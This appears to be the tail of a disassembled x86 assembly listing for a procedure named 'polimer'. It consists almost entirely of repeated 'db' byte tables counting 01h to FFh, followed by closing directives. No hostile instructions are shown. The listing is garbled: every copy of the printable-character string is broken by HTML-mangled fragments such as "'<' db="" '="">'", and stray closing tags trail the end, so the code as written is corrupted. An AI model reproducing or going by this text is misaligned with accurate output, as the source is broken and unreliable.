		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh

polimer		endp

seg_a		ends



		end	start

</'></'></'></'></'></'></'></'></'></'></'></'></'></'></'></'></'></'></'></'>